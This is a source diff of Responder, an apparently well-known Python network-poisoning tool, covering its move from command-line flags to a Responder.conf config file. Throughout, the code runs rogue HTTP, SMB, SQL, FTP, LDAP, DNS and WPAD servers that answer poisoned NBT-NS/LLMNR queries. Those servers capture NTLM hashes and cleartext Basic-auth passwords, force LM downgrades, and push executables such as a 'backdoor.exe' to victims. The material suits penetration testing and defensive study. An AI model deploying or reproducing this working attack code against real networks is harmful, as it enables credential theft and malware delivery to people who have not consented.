@@ -16,7 +16,7 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
-import sys,struct,SocketServer,re,optparse,socket,thread,Fingerprint,random,os
+import sys,struct,SocketServer,re,optparse,socket,thread,Fingerprint,random,os,ConfigParser
 from Fingerprint import RunSmbFinger,OsNameClientVersion
 from odict import OrderedDict
 from socket import inet_aton
@@ -27,41 +27,15 @@ parser = optparse.OptionParser(usage='python %prog -i 10.20.30.40 -b 1 -s On -r 
                                )
 parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="OURIP")
 
-parser.add_option('-I','--interfaceIP', action="store", help="The IP you want Responder to listen on, default is 0.0.0.0 (all interfaces)", metavar="10.20.30.40",dest="BOUND_TO_IP")
+parser.add_option('-b', '--basic',action="store", help="Set this to On if you want to return a Basic HTTP authentication. Off will return an NTLM authentication.This option is mandatory.", metavar="Off",dest="Basic", choices=['On','ON','Off','OFF'], default="Off")
 
-parser.add_option('-b', '--basic',action="store", help="Set this to 1 if you want to return a Basic HTTP authentication. 0 will return an NTLM authentication.This option is mandatory.", metavar="0",dest="Basic", choices=['0','1'], default="0")
+parser.add_option('-r', '--wredir',action="store", help="Set this to enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network (like classics 'nbns spoofer' will). Default value is therefore set to Off", metavar="Off",dest="Wredirect", choices=['On','ON','Off','OFF'], default="Off")
 
-parser.add_option('-s', '--http',action="store", help="Set this to On or Off to start/stop the HTTP server. Default value is On", metavar="Off",dest="on_off", choices=['On','Off'], default="On")
+parser.add_option('-f','--fingerprint', action="store", dest="Finger", help = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.", metavar="Off", choices=['On','ON','Off','OFF'], default="Off")
 
-parser.add_option('--ssl',action="store", help="Set this to On or Off to start/stop the HTTPS server. Default value is On", metavar="Off",dest="SSL_On_Off", choices=['On','Off'], default="On")
+parser.add_option('-w','--wpad', action="store", dest="WPAD_On_Off", help = "Set this to On or Off to start/stop the WPAD rogue proxy server. Default value is Off", metavar="Off", choices=['On','ON','Off','OFF'], default="Off")
 
-parser.add_option('-S', '--smb',action="store", help="Set this to On or Off to start/stop the SMB server. Default value is On", metavar="Off",dest="SMB_on_off", choices=['On','Off'], default="On")
-
-parser.add_option('-q', '--sql',action="store", help="Set this to On or Off to start/stop the SQL server. Default value is On", metavar="Off",dest="SQL_on_off", choices=['On','Off'], default="On")
-
-parser.add_option('-r', '--wredir',action="store", help="Set this to enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network (like classics 'nbns spoofer' will). Default value is therefore set to Off (0)", metavar="0",dest="Wredirect", choices=['1','0'], default="0")
-
-parser.add_option('-c','--challenge', action="store", dest="optChal", help = "The server challenge to set for NTLM authentication.  If not set, then defaults to 1122334455667788, the most common challenge for existing Rainbow Tables", metavar="1122334455667788", default="1122334455667788")
-
-parser.add_option('-l','--logfile', action="store", dest="sessionLog", help = "Log file to use for Responder session. ", metavar="Responder-Session.log", default="Responder-Session.log")
-
-parser.add_option('-f','--fingerprint', action="store", dest="Finger", help = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.", metavar="Off", choices=['On','Off'], default="Off")
-
-parser.add_option('-F','--ftp', action="store", dest="FTP_On_Off", help = "Set this to On or Off to start/stop the FTP server. Default value is On", metavar="On", choices=['On','Off'], default="On")
-
-parser.add_option('-L','--ldap', action="store", dest="LDAP_On_Off", help = "Set this to On or Off to start/stop the LDAP server. Default value is On", metavar="On", choices=['On','Off'], default="On")
-
-parser.add_option('-D','--dns', action="store", dest="DNS_On_Off", help = "Set this to On or Off to start/stop the DNS server. Default value is On", metavar="On", choices=['On','Off'], default="On")
-
-parser.add_option('-w','--wpad', action="store", dest="WPAD_On_Off", help = "Set this to On or Off to start/stop the WPAD rogue proxy server. Default value is Off", metavar="Off", choices=['On','Off'], default="Off")
-
-parser.add_option('--lm',action="store", help="Set this to 1 if you want to force LM hashing downgrade for Windows XP/2003 and earlier. Default value is False (0)", metavar="0",dest="LM_On_Off", choices=['0','1'], default="0")
-
-parser.add_option('-e',action="store", help="Set this option to 1 if you'd like to serve a specific file via http & WPAD proxy server when  one of these extensions are present in the url. Default value is False (0)", metavar="0",dest="Exe_On_Off", choices=['0','1'], default="0")
-
-parser.add_option('--exe',action="store", help="Set this option to 1 if you'd like to always serve a specific file via http & WPAD proxy server. It's best to use this option with the --file option. Default value is False (0)", metavar="0",dest="Exec_Mode_On_Off", choices=['0','1'], default="0")
-
-parser.add_option('--file',action="store", help="Serve a specific file when using -e option. Default is FixInternet.exe (provided with Responder)", metavar="backdoor.exe",dest="FILENAME", default="FixInternet.exe")
+parser.add_option('--lm',action="store", help="Set this to Off if you want to force LM hashing downgrade for Windows XP/2003 and earlier. Default value is Off", metavar="Off",dest="LM_On_Off", choices=['On','ON','Off','OFF'], default="Off")
 
 options, args = parser.parse_args()
 
@@ -70,38 +44,45 @@ if options.OURIP is None:
    parser.print_help()
    exit(-1)
 
-if len(options.optChal) is not 16:
+#Config parsing
+config = ConfigParser.ConfigParser()
+config.read('Responder.conf')
+
+# Set some vars.
+BIND_TO_IP = config.get('Responder Core', 'Bind_to')
+On_Off = config.get('Responder Core', 'HTTP').upper()
+SSL_On_Off = config.get('Responder Core', 'HTTPS').upper()
+SMB_On_Off = config.get('Responder Core', 'SMB').upper()
+SQL_On_Off = config.get('Responder Core', 'SQL').upper()
+FTP_On_Off = config.get('Responder Core', 'FTP').upper()
+LDAP_On_Off = config.get('Responder Core', 'LDAP').upper()
+DNS_On_Off = config.get('Responder Core', 'DNS').upper()
+NumChal = config.get('Responder Core', 'Challenge')
+SessionLog = config.get('Responder Core', 'SessionLog')
+Exe_On_Off = config.get('HTTP Server', 'Serve-Exe').upper()
+Exec_Mode_On_Off = config.get('HTTP Server', 'Serve-Always').upper()
+FILENAME = config.get('HTTP Server', 'Filename')
+WPAD_Script = config.get('HTTP Server', 'WPADScript')
+#Cli options.
+OURIP = options.OURIP
+LM_On_Off = options.LM_On_Off.upper()
+WPAD_On_Off = options.WPAD_On_Off.upper()
+Wredirect = options.Wredirect.upper()
+Basic = options.Basic.upper()
+Finger_On_Off = options.Finger.upper()
+
+if BIND_TO_IP == None:
+   BIND_TO_IP = ''
+
+if len(NumChal) is not 16:
    print "The challenge must be exactly 16 chars long.\nExample: -c 1122334455667788\n"
    parser.print_help()
    exit(-1)
 
 #Logger
 import logging
-logging.basicConfig(filename=str(options.sessionLog),level=logging.INFO,format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
+logging.basicConfig(filename=str(SessionLog),level=logging.INFO,format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
 logging.warning('Responder Started')
-
-# Set some vars.
-OURIP = options.OURIP
-BOUND_TO_IP = options.BOUND_TO_IP
-Basic = options.Basic
-On_Off = options.on_off.upper()
-Exe_On_Off = options.Exe_On_Off
-Exec_Mode_On_Off =options.Exec_Mode_On_Off
-FILENAME = options.FILENAME
-SSL_On_Off = options.SSL_On_Off.upper()
-SMB_On_Off = options.SMB_on_off.upper()
-SQL_On_Off = options.SQL_on_off.upper()
-FTP_On_Off = options.FTP_On_Off.upper()
-LDAP_On_Off = options.LDAP_On_Off.upper()
-Finger_On_Off = options.Finger.upper()
-DNS_On_Off = options.DNS_On_Off.upper()
-WPAD_On_Off = options.WPAD_On_Off.upper()
-LM_On_Off = options.LM_On_Off.upper()
-Wredirect = options.Wredirect
-NumChal = options.optChal
-
-if BOUND_TO_IP == None:
-   BOUND_TO_IP = ''
 
 def Show_Help(ExtraHelpData):
    help = "NBT Name Service/LLMNR Answerer 1.0.\nPlease send bugs/comments to: lgaffie@trustwave.com\nTo kill this script hit CRTL-C\n\n"
@@ -131,7 +112,7 @@ Challenge = ""
 for i in range(0,len(NumChal),2):
     Challenge += NumChal[i:i+2].decode("hex")
 
-Show_Help("[+]NBT-NS & LLMNR responder started\nGlobal Parameters set:\nChallenge set is: %s\nWPAD Proxy Server is:%s\nHTTP Server is:%s\nHTTPS Server is:%s\nSMB Server is:%s\nSMB LM support is set to:%s\nSQL Server is:%s\nFTP Server is:%s\nDNS Server is:%s\nLDAP Server is:%s\nFingerPrint Module is:%s\nServing Executable via HTTP&WPAD is:%s\nAlways serving executable via HTTP&WPAD is:%s\n\n"%(NumChal,WPAD_On_Off,On_Off,SSL_On_Off,SMB_On_Off,LM_On_Off,SQL_On_Off,FTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off,Exe_On_Off,Exec_Mode_On_Off))
+Show_Help("[+]NBT-NS & LLMNR responder started\n[+]Loading Responder.conf File..\nGlobal Parameters set:\nChallenge set is: %s\nWPAD Proxy Server is:%s\nWPAD script loaded:%s\nHTTP Server is:%s\nHTTPS Server is:%s\nSMB Server is:%s\nSMB LM support is set to:%s\nSQL Server is:%s\nFTP Server is:%s\nDNS Server is:%s\nLDAP Server is:%s\nFingerPrint Module is:%s\nServing Executable via HTTP&WPAD is:%s\nAlways Serving a Specific File via HTTP&WPAD is:%s\n\n"%(NumChal,WPAD_On_Off,WPAD_Script,On_Off,SSL_On_Off,SMB_On_Off,LM_On_Off,SQL_On_Off,FTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off,Exe_On_Off,Exec_Mode_On_Off))
 
 #Simple NBNS Services.
 W_REDIRECT   = "\x41\x41\x00"
@@ -191,7 +172,7 @@ class NBT_Ans(Packet):
 def Validate_NBT_NS(data,Wredirect):
     if FILE_SERVER == data[43:46]:
        return True
-    if Wredirect == "1":
+    if Wredirect == "ON":
        if W_REDIRECT == data[43:46]:
           return True
     else:
@@ -909,7 +890,7 @@ def WpadCustom(data,client):
           Message = "[+]WPAD file sent to: %s"%(client)
           print Message
           logging.warning(Message)
-          buffer1 = WPADScript()
+          buffer1 = WPADScript(Payload=WPAD_Script)
           buffer1.calculate()
           return str(buffer1)
        else:
@@ -917,13 +898,13 @@ def WpadCustom(data,client):
 
 # Function used to check if we answer with a Basic or NTLM auth. 
 def Basic_Ntlm(Basic):
-    if Basic == "1":
+    if Basic == "ON":
        return IIS_Basic_401_Ans()
-    if Basic == "0":
+    if Basic == "OFF":
        return IIS_Auth_401_Ans()
 
 def ServeEXE(data,client, Filename):
-    Message = "[+]Exe file sent to: %s . Try telnet %s on port 140"%(client,client)
+    Message = "[+]Sent %s file sent to: %s."%(Filename,client)
     print Message
     logging.warning(Message)
     with open (Filename, "rb") as bk:
@@ -932,33 +913,42 @@ def ServeEXE(data,client, Filename):
        return data
 
 def ServeEXEOrNot(on_off):
-    if Exe_On_Off == "1":
+    if Exe_On_Off == "ON":
        return True
-    if Exe_On_Off == "0":
+    if Exe_On_Off == "OFF":
        return False
 
 def ServeEXECAlwaysOrNot(on_off):
-    if Exec_Mode_On_Off == "1":
+    if Exec_Mode_On_Off == "ON":
        return True
-    if Exec_Mode_On_Off == "0":
+    if Exec_Mode_On_Off == "OFF":
        return False
 
-Exec_Mode_On_Off
+def IsExecutable(Filename):
+    exe = re.findall('.exe',Filename)
+    if exe:
+       return True
+    else:
+       return False
 
 #Handle HTTP packet sequence.
 def PacketSequence(data,client):
     a = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
     b = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
     if ServeEXEOrNot(Exe_On_Off) and re.findall('.exe', data):
-       payload = ServeEXE(data,client,FILENAME)
-       buffer1 = ServerExeFile(Payload = payload,filename=FILENAME)
+       File = config.get('HTTP Server', 'ExecFilename')
+       buffer1 = ServerExeFile(Payload = ServeEXE(data,client,File),filename=File)
        buffer1.calculate()
        return str(buffer1)
     if ServeEXECAlwaysOrNot(Exec_Mode_On_Off):
-       payload = ServeEXE(data,client,FILENAME)
-       buffer1 = ServeAlwaysExeFile(Payload = payload,ContentDiFile=FILENAME)
-       buffer1.calculate()
-       return str(buffer1)
+       if IsExecutable(FILENAME):
+          buffer1 = ServeAlwaysExeFile(Payload = ServeEXE(data,client,FILENAME),ContentDiFile=FILENAME)
+          buffer1.calculate()
+          return str(buffer1)
+       else:
+          buffer1 = ServeAlwaysNormalFile(Payload = ServeEXE(data,client,FILENAME))
+          buffer1.calculate()
+          return str(buffer1)
     if a:
        packetNtlm = b64decode(''.join(a))[8:9]
        if packetNtlm == "\x01":
@@ -972,7 +962,7 @@ def PacketSequence(data,client):
        if packetNtlm == "\x03":
           NTLM_Auth= b64decode(''.join(a))
           ParseHTTPHash(NTLM_Auth,client)
-          buffer1 = IIS_Auth_Granted()
+          buffer1 = IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe'))
           buffer1.calculate()
           return str(buffer1)
     if b:
@@ -981,7 +971,7 @@ def PacketSequence(data,client):
        WriteData(outfile,b64decode(''.join(b)), b64decode(''.join(b)))
        print "[+]HTTP-User & Password:", b64decode(''.join(b))
        logging.warning('[+]HTTP-User & Password: %s'%(b64decode(''.join(b))))
-       buffer1 = IIS_Auth_Granted()
+       buffer1 = IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe'))
        buffer1.calculate()
        return str(buffer1)
 
@@ -1049,9 +1039,9 @@ def HostDidntAuthBefore(client):
        return True
 
 def ProxyBasic_Ntlm(Basic):
-    if Basic == "1":
+    if Basic == "ON":
        return IIS_Basic_407_Ans()
-    if Basic == "0":
+    if Basic == "OFF":
        return IIS_Auth_407_Ans()
 
 def ParseDomain(data,client):
@@ -1071,15 +1061,19 @@ def ProxyPacketSequence(data,client):
     a = re.findall('(?<=Proxy-Authorization: NTLM )[^\\r]*', data)
     b = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
     if ServeEXEOrNot(Exe_On_Off) and re.findall('.exe', data):
-       payload = ServeEXE(data,client,FILENAME)
-       buffer1 = ServerExeFile(Payload = payload, filename=FILENAME)
+       File = config.get('HTTP Server', 'ExecFilename')
+       buffer1 = ServerExeFile(Payload = ServeEXE(data,client,File),filename=File)
        buffer1.calculate()
        return str(buffer1)
     if ServeEXECAlwaysOrNot(Exec_Mode_On_Off):
-       payload = ServeEXE(data,client,FILENAME)
-       buffer1 = ServeAlwaysExeFile(Payload = payload,ContentDiFile=FILENAME)
-       buffer1.calculate()
-       return str(buffer1)
+       if IsExecutable(FILENAME):
+          buffer1 = ServeAlwaysExeFile(Payload = ServeEXE(data,client,FILENAME),ContentDiFile=FILENAME)
+          buffer1.calculate()
+          return str(buffer1)
+       else:
+          buffer1 = ServeAlwaysNormalFile(Payload = ServeEXE(data,client,FILENAME))
+          buffer1.calculate()
+          return str(buffer1)
     if a:
        packetNtlm = b64decode(''.join(a))[8:9]
        if packetNtlm == "\x01":
@@ -1199,7 +1193,7 @@ def HTTPSPacketSequence(data,client):
        if packetNtlm == "\x03":
           NTLM_Auth= b64decode(''.join(a))
           ParseHTTPSHash(NTLM_Auth,client)
-          buffer1 = str(IIS_Auth_Granted())
+          buffer1 = str(IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe')))
           return buffer1
     if b:
        GrabCookie(data,client)
@@ -1207,7 +1201,7 @@ def HTTPSPacketSequence(data,client):
        WriteData(outfile,b64decode(''.join(b)), b64decode(''.join(b)))
        print "[+]HTTPS-User & Password:", b64decode(''.join(b))
        logging.warning('[+]HTTPS-User & Password: %s'%(b64decode(''.join(b))))
-       buffer1 = str(IIS_Auth_Granted())
+       buffer1 = str(IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe')))
        return buffer1
 
     else:
@@ -1217,8 +1211,8 @@ class SSlSock(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
     def __init__(self, server_address, RequestHandlerClass):
         SocketServer.BaseServer.__init__(self, server_address, RequestHandlerClass)
         ctx = SSL.Context(SSL.SSLv3_METHOD)
-        cert = 'Certs/responder.crt'
-        key =  'Certs/responder.key'
+        cert = config.get('HTTPS Server', 'cert')
+        key =  config.get('HTTPS Server', 'key')
         ctx.use_privatekey_file(key)
         ctx.use_certificate_file(cert)
         self.socket = SSL.Connection(ctx, socket.socket(self.address_family, self.socket_type))
@@ -1402,59 +1396,59 @@ class LDAP(SocketServer.BaseRequestHandler):
 #Function name self-explanatory
 def Is_HTTP_On(on_off):
     if on_off == "ON":
-       return thread.start_new(serve_thread_tcp,(BOUND_TO_IP, 80,HTTP))
+       return thread.start_new(serve_thread_tcp,(BIND_TO_IP, 80,HTTP))
     if on_off == "OFF":
        return False
 
 #Function name self-explanatory
 def Is_HTTPS_On(SSL_On_Off):
     if SSL_On_Off == "ON":
-       return thread.start_new(serve_thread_SSL,(BOUND_TO_IP, 443,DoSSL))
+       return thread.start_new(serve_thread_SSL,(BIND_TO_IP, 443,DoSSL))
     if SSL_On_Off == "OFF":
        return False
 
 #Function name self-explanatory
 def Is_WPAD_On(on_off):
     if on_off == "ON":
-       return thread.start_new(serve_thread_tcp,(BOUND_TO_IP, 3141,HTTPProxy))
+       return thread.start_new(serve_thread_tcp,(BIND_TO_IP, 3141,HTTPProxy))
     if on_off == "OFF":
        return False
 
 #Function name self-explanatory
 def Is_SMB_On(SMB_On_Off):
     if SMB_On_Off == "ON":
-       if LM_On_Off == "1":
-          return thread.start_new(serve_thread_tcp, (BOUND_TO_IP, 445,SMB1LM)),thread.start_new(serve_thread_tcp,('', 139,SMB1LM))
+       if LM_On_Off == "ON":
+          return thread.start_new(serve_thread_tcp, (BIND_TO_IP, 445,SMB1LM)),thread.start_new(serve_thread_tcp,(BIND_TO_IP, 139,SMB1LM))
        else:
-          return thread.start_new(serve_thread_tcp, (BOUND_TO_IP, 445,SMB1)),thread.start_new(serve_thread_tcp,('', 139,SMB1))
+          return thread.start_new(serve_thread_tcp, (BIND_TO_IP, 445,SMB1)),thread.start_new(serve_thread_tcp,(BIND_TO_IP, 139,SMB1))
     if SMB_On_Off == "OFF":
        return False
 
 #Function name self-explanatory
 def Is_SQL_On(SQL_On_Off):
     if SQL_On_Off == "ON":
-       return thread.start_new(serve_thread_tcp,(BOUND_TO_IP, 1433,MSSQL))
+       return thread.start_new(serve_thread_tcp,(BIND_TO_IP, 1433,MSSQL))
     if SQL_On_Off == "OFF":
        return False
 
 #Function name self-explanatory
 def Is_FTP_On(FTP_On_Off):
     if FTP_On_Off == "ON":
-       return thread.start_new(serve_thread_tcp,(BOUND_TO_IP, 21,FTP))
+       return thread.start_new(serve_thread_tcp,(BIND_TO_IP, 21,FTP))
     if FTP_On_Off == "OFF":
        return False
 
 #Function name self-explanatory
 def Is_LDAP_On(LDAP_On_Off):
     if LDAP_On_Off == "ON":
-       return thread.start_new(serve_thread_tcp,(BOUND_TO_IP, 389,LDAP))
+       return thread.start_new(serve_thread_tcp,(BIND_TO_IP, 389,LDAP))
     if LDAP_On_Off == "OFF":
        return False
 
 #Function name self-explanatory
 def Is_DNS_On(DNS_On_Off):
     if DNS_On_Off == "ON":
-       return thread.start_new(serve_thread_udp,(BOUND_TO_IP, 53,DNS)),thread.start_new(serve_thread_tcp,('', 53,DNSTCP))
+       return thread.start_new(serve_thread_udp,(BIND_TO_IP, 53,DNS)),thread.start_new(serve_thread_tcp,(BIND_TO_IP, 53,DNSTCP))
     if DNS_On_Off == "OFF":
        return False
 
@@ -1475,6 +1469,7 @@ def serve_thread_tcp(host, port, handler):
 		server.serve_forever()
 	except:
 		print "Error starting TCP server on port " + str(port) + ". Check that you have the necessary permissions (i.e. root) and no other servers are running."
+                raise
 
 def serve_thread_SSL(host, port, handler):
 	try:
@@ -1494,9 +1489,9 @@ def main():
       Is_LDAP_On(LDAP_On_Off)
       Is_DNS_On(DNS_On_Off)
       #Browser listener loaded by default
-      thread.start_new(serve_thread_udp,(BOUND_TO_IP, 138,Browser))
+      thread.start_new(serve_thread_udp,(BIND_TO_IP, 138,Browser))
       ## Poisoner loaded by default, it's the purpose of this tool...
-      thread.start_new(serve_thread_udp,(BOUND_TO_IP, 137,NB))
+      thread.start_new(serve_thread_udp,(BIND_TO_IP, 137,NB))
       thread.start_new(RunLLMNR())
     except KeyboardInterrupt:
         exit()
@@ -1507,4 +1502,5 @@ if __name__ == '__main__':
     except:
         raise
     raw_input()
+
 
